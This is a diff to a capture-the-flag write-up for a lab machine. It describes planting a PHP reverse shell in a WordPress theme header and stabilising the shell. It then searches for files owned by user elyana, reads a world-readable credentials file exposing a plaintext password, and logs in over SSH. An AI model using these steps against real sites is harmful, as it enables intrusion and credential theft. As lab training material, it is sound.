@@ -504,7 +504,6 @@ Warning: Permanently added '10.10.199.13' (ECDSA) to the list of known hosts.
 elyana@10.10.199.13's password: 
 Permission denied, please try again.
 ```
-## Privilege Escalation
 * WordPress Appearance > Theme Editor.
 * Open "Theme Header" (header.php) from "Theme Files" list.
 * Copy "php-reverse-shell.php" to working folder.
@@ -530,4 +529,47 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
+```
+* Stabilise netcat shell.
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+## Privilege Escalation
+* Find user.txt flag.
+```
+cd /home/elanya
+```
+* "www-data" user has no read privileges on "user.txt" file.
+```
+-rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
+```
+* "hint.txt" contains "Elyana's user password is hidden in the system. Find it ;)".
+* Find all files owned by elyana.
+```
+find / -user elyana -type f 2>/dev/null
+
+/home/elyana/user.txt
+/home/elyana/.bash_logout
+/home/elyana/hint.txt
+/home/elyana/.bash_history
+/home/elyana/.profile
+/home/elyana/.sudo_as_admin_successful
+/home/elyana/.bashrc
+/etc/mysql/conf.d/private.txt
+```
+* "/etc/mysql/conf.d/private.txt" is readable by "www-data" user and contains credentials.
+```
+ls -la /etc/mysql/conf.d/pricate.txt
+-rwxrwxrwx 1 elyana elyana   34 Oct  5  2020 private.txt
+
+cat /etc/mysql/conf.d/private.txt 
+user: elyana
+password: E@syR18ght
+```
+* Credentials allowed SSH access to target host.
+```
+ssh elyana@10.10.199.13
+elyana@10.10.199.13's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+[snip ...]
 ```
